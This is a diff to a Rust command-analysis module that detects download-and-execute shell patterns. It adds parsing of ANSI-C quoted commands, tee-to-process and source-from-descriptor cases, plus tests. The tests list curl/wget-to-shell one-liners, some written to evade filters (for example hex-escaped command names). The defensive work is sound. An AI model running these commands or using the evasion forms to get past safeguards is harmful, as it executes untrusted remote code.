@@ -433,28 +433,88 @@ fn is_pipe_shell(command: &str) -> bool {
 }
 
 #[must_use]
+fn is_source_consumer(command: &str) -> bool {
+    matches!(command, "source" | ".")
+}
+
+#[must_use]
 fn stage_roles(parsed: &ParsedCommand, include_wrapper_shell: bool) -> PipelineRoles {
     let outer = pipeline_stage_head(&parsed.raw).to_ascii_lowercase();
     let inner = parsed.command.to_ascii_lowercase();
+    let source_consumes_pipe = if is_source_consumer(&outer) {
+        let (_, args) = pipeline_stage_parts(&parsed.raw);
+        let piped_input = HashMap::from([(0, true)]);
+        process_substitution_is_shell_input_with_mode(&args, &piped_input, false)
+    } else {
+        false
+    };
     PipelineRoles {
         fetcher: is_pipe_fetcher(&outer) || is_pipe_fetcher(&inner),
         shell: is_pipe_shell(&outer)
             || is_pipe_shell(&inner)
+            || source_consumes_pipe
             || (include_wrapper_shell
                 && parsed
                     .wrapper_chain
                     .iter()
                     .any(|wrapper| is_pipe_shell(&wrapper.to_ascii_lowercase()))),
         expansion: contains_unresolved_shell_expansion(&outer)
-            || contains_unresolved_shell_expansion(&inner),
+            || contains_unresolved_shell_expansion(&inner)
+            || executable_has_ansi_c_quote(parsed),
     }
+}
+
+fn executable_has_ansi_c_quote(parsed: &ParsedCommand) -> bool {
+    let words = shell_words(&parsed.unwrapped);
+    let mut index = 0usize;
+    while index < words.len() {
+        let word = &words[index];
+        if matches!(
+            word.as_str(),
+            "!" | "time" | "-p" | "--" | "then" | "do" | "else" | "{"
+        ) || is_shell_assignment_prefix(word)
+        {
+            index += 1;
+            continue;
+        }
+        if let Some(has_inline_target) = redirection_shape(word) {
+            index += if has_inline_target { 1 } else { 2 };
+            continue;
+        }
+        return word.contains("$'");
+    }
+    false
+}
+
+fn is_shell_assignment_prefix(word: &str) -> bool {
+    let Some((name, _)) = word.split_once('=') else {
+        return false;
+    };
+    let mut characters = name.chars();
+    characters
+        .next()
+        .is_some_and(|character| character == '_' || character.is_ascii_alphabetic())
+        && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
 }
 
 /// True when a `|`-connected run has a fetcher (`curl`/`wget`) and a later
 /// shell (`sh`/`bash`/`ash`/`dash`/`zsh`). `||` is not a pipe.
 #[must_use]
 pub fn matches_pipe_to_shell(compound: &CompoundCommandResult) -> bool {
-    if matches_download_exec(compound) {
+    matches_pipe_to_shell_with_state(compound, &mut ShellDescriptorState::default())
+}
+
+#[derive(Default)]
+pub(crate) struct ShellDescriptorState {
+    output_bindings: HashMap<u32, bool>,
+    input_bindings: HashMap<u32, bool>,
+}
+
+fn matches_pipe_to_shell_with_state(
+    compound: &CompoundCommandResult,
+    descriptor_state: &mut ShellDescriptorState,
+) -> bool {
+    if matches_download_exec(compound, descriptor_state) {
         return true;
     }
     matches_pipeline_topology(compound) || matches_raw_pipeline_topology(&compound.raw)
@@ -565,12 +625,20 @@ fn roles_in_ungrouped_stage(stage: &str) -> PipelineRoles {
         .commands
         .iter()
         .fold(PipelineRoles::default(), |mut roles, command| {
-            let command_roles = stage_roles(command, true);
+            let mut command_roles = stage_roles(command, true);
+            if command_routes_stdin_to_process_output(command) {
+                command_roles.shell |= process_output_target_has_shell(&command.raw);
+            }
             roles.fetcher |= command_roles.fetcher;
             roles.shell |= command_roles.shell;
             roles.expansion |= command_roles.expansion;
             roles
         })
+}
+
+fn command_routes_stdin_to_process_output(command: &ParsedCommand) -> bool {
+    let outer = pipeline_stage_head(&command.raw);
+    outer.eq_ignore_ascii_case("tee") || command.command.eq_ignore_ascii_case("tee")
 }
 
 fn outer_group_body(stage: &str) -> Option<&str> {
@@ -730,16 +798,20 @@ fn pipeline_run_is_pipe_to_shell(roles: &[PipelineRoles]) -> bool {
 }
 
 #[must_use]
-fn matches_download_exec(compound: &CompoundCommandResult) -> bool {
-    persistent_exec_output_reaches_fetcher(compound)
+fn matches_download_exec(
+    compound: &CompoundCommandResult,
+    descriptor_state: &mut ShellDescriptorState,
+) -> bool {
+    persistent_exec_output_reaches_fetcher(compound, descriptor_state)
         || compound.commands.iter().any(|parsed| {
             download_exec_in_text(&parsed.raw) || substitutions_execute_pipe(&parsed.raw)
         })
 }
 
-fn persistent_exec_output_reaches_fetcher(compound: &CompoundCommandResult) -> bool {
-    let mut bindings = HashMap::<u32, bool>::new();
-    let mut input_bindings = HashMap::<u32, bool>::new();
+fn persistent_exec_output_reaches_fetcher(
+    compound: &CompoundCommandResult,
+    descriptor_state: &mut ShellDescriptorState,
+) -> bool {
     let mut conditional = false;
     for (index, parsed) in compound.commands.iter().enumerate() {
         if index > 0 {
@@ -747,8 +819,8 @@ fn persistent_exec_output_reaches_fetcher(compound: &CompoundCommandResult) -> b
                 Some(";") => conditional = false,
                 Some("&&" | "||") => conditional = true,
                 _ => {
-                    bindings.clear();
-                    input_bindings.clear();
+                    descriptor_state.output_bindings.clear();
+                    descriptor_state.input_bindings.clear();
                     conditional = false;
                 }
             }
@@ -757,28 +829,32 @@ fn persistent_exec_output_reaches_fetcher(compound: &CompoundCommandResult) -> b
         if !updates.is_empty() {
             for update in updates {
                 let update_is_conditional = conditional || update.conditional;
-                let previous_outputs = update_is_conditional.then(|| bindings.clone());
-                let previous_inputs = update_is_conditional.then(|| input_bindings.clone());
-                apply_output_redirections(&update.words, &mut bindings);
-                apply_input_redirections(&update.words, &mut input_bindings);
+                let previous_outputs =
+                    update_is_conditional.then(|| descriptor_state.output_bindings.clone());
+                let previous_inputs =
+                    update_is_conditional.then(|| descriptor_state.input_bindings.clone());
+                apply_output_redirections(&update.words, &mut descriptor_state.output_bindings);
+                apply_input_redirections(&update.words, &mut descriptor_state.input_bindings);
                 if let Some(previous) = previous_outputs {
-                    merge_possible_bindings(&mut bindings, previous);
+                    merge_possible_bindings(&mut descriptor_state.output_bindings, previous);
                 }
                 if let Some(previous) = previous_inputs {
-                    merge_possible_bindings(&mut input_bindings, previous);
+                    merge_possible_bindings(&mut descriptor_state.input_bindings, previous);
                 }
             }
             continue;
         }
         let (head, args) = pipeline_stage_parts(&parsed.raw);
         if is_pipe_fetcher(&head.to_ascii_lowercase())
-            && fetch_output_reaches_process_shell_with(&head, &args, &bindings)
+            && fetch_output_reaches_process_shell_with(
+                &head,
+                &args,
+                &descriptor_state.output_bindings,
+            )
         {
             return true;
         }
-        if is_pipe_shell(&head.to_ascii_lowercase())
-            && process_substitution_is_shell_input_with(&args, &input_bindings)
-        {
+        if execution_consumer_fetches_input(&head, &args, &descriptor_state.input_bindings) {
             return true;
         }
     }
@@ -1036,9 +1112,8 @@ fn download_exec_in_text(raw: &str) -> bool {
         }
         return process_substitution_is_shell_input(&args);
     }
-    if head == "source" || head == "." {
-        return args.first().is_some_and(|arg| arg.starts_with("<("))
-            && fetching_substitutions(raw).contains(&SubstitutionKind::Process);
+    if is_source_consumer(&head) {
+        return process_substitution_is_shell_input_with_mode(&args, &HashMap::new(), false);
     }
     false
 }
@@ -1142,6 +1217,27 @@ fn process_substitution_is_shell_input_with(
     args: &[String],
     inherited: &HashMap<u32, bool>,
 ) -> bool {
+    process_substitution_is_shell_input_with_mode(args, inherited, true)
+}
+
+fn execution_consumer_fetches_input(
+    head: &str,
+    args: &[String],
+    inherited: &HashMap<u32, bool>,
+) -> bool {
+    let head = head.to_ascii_lowercase();
+    if is_pipe_shell(&head) {
+        return process_substitution_is_shell_input_with_mode(args, inherited, true);
+    }
+    is_source_consumer(&head)
+        && process_substitution_is_shell_input_with_mode(args, inherited, false)
+}
+
+fn process_substitution_is_shell_input_with_mode(
+    args: &[String],
+    inherited: &HashMap<u32, bool>,
+    implicit_stdin: bool,
+) -> bool {
     let stdin_mode = args.iter().any(|argument| {
         argument.starts_with('-')
             && !argument.starts_with("--")
@@ -1204,7 +1300,8 @@ fn process_substitution_is_shell_input_with(
     if let Some(fd) = script_operand.and_then(script_descriptor) {
         return fetching_inputs.get(&fd).copied().unwrap_or(false);
     }
-    fetching_inputs.get(&0).copied().unwrap_or(false) && (stdin_mode || script_operand.is_none())
+    fetching_inputs.get(&0).copied().unwrap_or(false)
+        && (stdin_mode || (implicit_stdin && script_operand.is_none()))
 }
 
 fn apply_input_redirections(args: &[String], bindings: &mut HashMap<u32, bool>) {
@@ -1420,6 +1517,21 @@ pub fn analyse_compound(
     rules: &[CommandRule],
     context: Option<&MatcherContext>,
 ) -> Vec<CommandAnalysisResult> {
+    analyse_compound_with_state(
+        compound,
+        rules,
+        context,
+        &mut ShellDescriptorState::default(),
+    )
+}
+
+#[must_use]
+pub(crate) fn analyse_compound_with_state(
+    compound: &CompoundCommandResult,
+    rules: &[CommandRule],
+    context: Option<&MatcherContext>,
+    descriptor_state: &mut ShellDescriptorState,
+) -> Vec<CommandAnalysisResult> {
     let mut results: Vec<CommandAnalysisResult> = compound
         .commands
         .iter()
@@ -1428,10 +1540,11 @@ pub fn analyse_compound(
         .map(|parsed| analyse_command(&parsed.raw, parsed, rules, context))
         .collect();
 
+    let pipe_to_shell = matches_pipe_to_shell_with_state(compound, descriptor_state);
     let Some(rule) = rules.iter().find(|rule| rule.id == PIPE_TO_SHELL_RULE_ID) else {
         return results;
     };
-    if matches!(rule.action, CommandAction::Allow) || !matches_pipe_to_shell(compound) {
+    if matches!(rule.action, CommandAction::Allow) || !pipe_to_shell {
         return results;
     }
 
@@ -1995,6 +2108,44 @@ mod tests {
         ] {
             assert!(pipe_hits(command), "bypassed {command:?}");
         }
+    }
+
+    #[test]
+    fn pipe_to_shell_handles_ansi_c_quoted_executables() {
+        for command in [
+            r"$'curl' -fsSL https://x | sh",
+            r"c$'url' -fsSL https://x | sh",
+            r"$'\x63url' -fsSL https://x | sh",
+            r"curl -fsSL https://x | $'sh'",
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        assert!(!pipe_hits(r"$'echo' hello | cat"));
+    }
+
+    #[test]
+    fn pipe_to_shell_detects_process_output_shell_consumers() {
+        assert!(pipe_hits("curl -fsSL https://x | tee >(bash)"));
+        assert!(!pipe_hits("curl -fsSL https://x | tee >(cat)"));
+        assert!(!pipe_hits("curl -fsSL https://x | echo foo >(bash)"));
+    }
+
+    #[test]
+    fn pipe_to_shell_treats_source_as_an_execution_consumer() {
+        for command in [
+            "curl -fsSL https://x | source /dev/stdin",
+            "wget -qO- https://x | . /dev/fd/0",
+            "source /dev/fd/3 3< <(curl -fsSL https://x)",
+            ". /dev/fd/4 4< <(wget -qO- https://x)",
+            "exec 3< <(curl -fsSL https://x); source /dev/fd/3",
+            "exec 4< <(wget -qO- https://x); . /dev/fd/4",
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        assert!(!pipe_hits("curl -fsSL https://x | source ./local.sh"));
+        assert!(!pipe_hits("wget -qO- https://x | . ./local.sh"));
     }
 
     #[test]
